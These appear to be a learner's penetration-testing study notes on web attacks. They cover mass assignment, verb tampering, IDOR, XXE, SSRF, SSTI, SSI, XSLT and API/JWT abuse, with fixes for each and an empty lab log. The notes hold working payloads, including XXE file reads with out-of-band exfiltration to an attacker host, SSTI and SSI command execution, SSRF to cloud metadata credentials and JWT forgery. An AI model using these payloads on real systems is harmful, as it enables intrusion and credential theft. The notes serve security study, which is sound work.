# Web Attacks

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Advanced web attacks (HTTP verb tampering, IDOR, XXE, and related logic flaws).

## Mass Assignment (reference)
Framework binds user-supplied request params straight onto a model/object without a whitelist, so an attacker adds extra params (e.g. `admin=true`, `confirmed=1`) to set fields they shouldn't control → **privilege escalation / approval bypass / unauthorized data change**.

**Exploit = parameter tampering.** Add unexpected fields to the request body:
```http
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=newuser&password=pw123&confirmed=1     # sets an attribute the app meant to control
```
Rails example: `User.new(params[:user])` + sending `admin=true`.

**Fix = whitelist the fields:**
- Rails strong params: `params.require(:user).permit(:username, :email)`
- Laravel: `protected $fillable = ['username','email'];` (not `$guarded = []`)
- Express/Sequelize: build the object from named fields, not `req.body` wholesale

**Finding it:** look for register/profile/update endpoints, compare the object's full field list (from source or responses) against what the form sends, then try adding the privileged fields. Real cases: GitHub 2012, Shopify admin panel.

## HTTP Verb Tampering
Auth/filters often apply to one method only. Try other verbs to bypass.
```bash
curl -i -X OPTIONS http://t/admin/      # list allowed methods
curl -i -X HEAD http://t/admin/reset.php   # HEAD/GET may skip a POST-only auth check
```
- **Config bypass:** Apache `<Limit GET>`, Tomcat `<http-method>GET</http-method>`, ASP `verbs="GET"` → only that verb is protected; use another.
- **Logic bypass:** code filters `$_POST["x"]` but then uses `$_REQUEST["x"]` → send the param via GET to skip the filter (classic SQLi-via-verb). Fuzz verbs: `wfuzz -z file,verbs.txt -X FUZZ ...`.
- **Fix:** apply auth/validation to *all* methods; disable unused verbs.

## IDOR (Insecure Direct Object Reference)
App exposes an object ref (`?uid=2`, `/api/profile/2`) with no server-side authorization check → change it to read/modify others' data.
```bash
curl "http://t/documents.php?uid=3"                 # increment the ID
# mass-pull in a loop; or APIs:
curl -X PUT -d '{"uid":2,"name":"x"}' http://t/api/profile/2     # edit another user
curl -X DELETE http://t/api/profile/11
```
- **Encoded refs:** decode and tamper — `base64 -d`, `xxd -r -p`, md5 of sequential ints; weak JWTs via `jwt_tool ... -S none` (alg:none).
- Discover params with **Arjun**/ffuf. **Fix:** server-side authorization on every object, UUIDs (not sequential), rate-limit + log.

## XXE (XML External Entity)
App parses user XML with external entities enabled → file read, SSRF, sometimes RCE.
```xml
<!-- local file read -->
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
<!-- PHP source via filter -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
<!-- RCE if expect:// enabled -->
<!ENTITY xxe SYSTEM "expect://id">
```
- **Blind/OOB** (no output reflected): host an external DTD that exfils via `http://<me>/?c=%file;` (OOB) or triggers a parse error containing the file (error-based). Automate with **XXEinjector**.
- **Fix:** disable DTD / external-entity processing in the parser; validate input; patch libs.

## Server-side injection (reference)
Payloads below run `id` as a benign proof — swap for the real target action in a test.

### SSRF (Server-Side Request Forgery)
Make the server fetch a URL you control → reach internal services / cloud metadata / local files.
```text
http://127.0.0.1:<port>/        # internal port scan / reach localhost-only services
file:///etc/passwd              # local file read
http://169.254.169.254/latest/meta-data/   # AWS metadata (creds!) ; GCP: metadata.google.internal
gopher://<host>:<port>/_<raw>   # craft arbitrary TCP (e.g. to Redis/SMTP)
dict:// , ftp:// , php:// , data://
```
Filter bypasses: URL/double-encoding (`127.0.0.1%3A80`, `%253A`), octal `0177.0.0.1`, hex `0x7f.0.0.1`, IPv6 `[::1]`, DNS rebinding, odd ports. **Impact:** internal recon, cloud cred theft, SSRF→RCE via gopher.

### SSTI (Server-Side Template Injection)
Detect: inject `${{<%[%'"}}%\` and watch for errors / math eval (`{{7*7}}` → 49). Then by engine:
```text
Jinja2 (Python): {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
Twig (PHP):      {{['id']|filter('system')}}   (or {{system('id')}} on old)
Freemarker (Java): ${"freemarker.template.utility.Execute"?new()("id")}
Velocity (Java): #set($x=$e.class.forName('java.lang.Runtime')...exec('id'))
Smarty (PHP):    {system('id')}
Handlebars (JS): constructor.constructor('return process...child_process.execSync("id")')()
```
Blind: timing / OOB (Burp Collaborator). **Impact:** usually full RCE.

### SSI injection (.shtml)
```text
<!--#exec cmd="id" -->          # command exec
<!--#include file="/etc/passwd" -->
<!--#echo var="DATE_LOCAL" -->
```

### XSLT injection
```text
<xsl:value-of select="system-property('xsl:version')" />          # info disclosure
<xsl:value-of select="unparsed-text('/etc/passwd','utf-8')" />    # LFI
<xsl:value-of select="php:function('system','id')" />             # RCE (PHP-XSLT)
document('http://<attacker>/x.xml')                                # SSRF/XXE
```

**Finding/testing tools:** `wfuzz -c -z file,wl.txt http://t/FUZZ`, Burp, ffuf; confirm reflection points then try the engine-specific payloads.
**Fix:** input whitelisting, don't pass user input into templates/URLs/XSL, sandbox the engine, block cloud-metadata IPs, output encoding, least privilege.

> SSRF and SSTI are the heavy hitters: SSRF → cloud creds (169.254.169.254) is a top real-world finding, and SSTI is near-always RCE once you ID the engine. Fingerprint the engine first (the `{{7*7}}` vs `${7*7}` test), then fire the matching payload.

## Web service & API attacks (reference)
APIs expose the same web vulns plus method/auth-specific ones. First enumerate endpoints and methods.
```bash
# discover endpoints / params
gobuster dir -u http://t/api -w api_wordlist.txt ; python3 arjun.py -u http://t/api/x
# REST verbs — test each for authz (IDOR/mass-assignment territory)
curl -X GET  http://t/api/users
curl -X PUT  -d '{"admin":true}' http://t/api/users/1     # privilege via mass assignment
curl -X DELETE http://t/api/users/1
# RPC method fuzzing
wfuzz -z file,methods.txt -d '{"method":"FUZZ","params":{},"id":0}' http://t/   # JSON-RPC
wfuzz -z file,methods.txt -d '<methodCall><methodName>FUZZ</methodName>...' http://t/RPC2   # XML-RPC
# SOAP: grab the WSDL first
wsdump.pl -o out.txt http://t/service?wsdl
```
- **JWT attacks** (`jwt_tool <JWT> -C`): alg:none, weak HMAC secret (crack it), `kid` injection, missing signature check → forge admin tokens.
- **API-borne SSRF/XXE:** `?url=http://169.254.169.254/` (cloud creds), XML body with external entity → same as the web-attacks above.
- **Rate-limit bypass:** rotate `X-Forwarded-For` (`ffuf ... -H "X-Forwarded-For: FUZZ"`) to defeat per-IP throttling on login/OTP.
- **Fix:** authz on every endpoint+method, validate JWT signature+alg server-side, don't trust `X-Forwarded-For`, schema-validate input, rate-limit properly.

> APIs fail the same ways (IDOR, mass assignment, SSRF, XXE) but with less UI to hide behind — the method (PUT/DELETE) and the auth token are the attack surface. JWT `alg:none` and object-level authz (BOLA/IDOR) are the top two API findings.

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
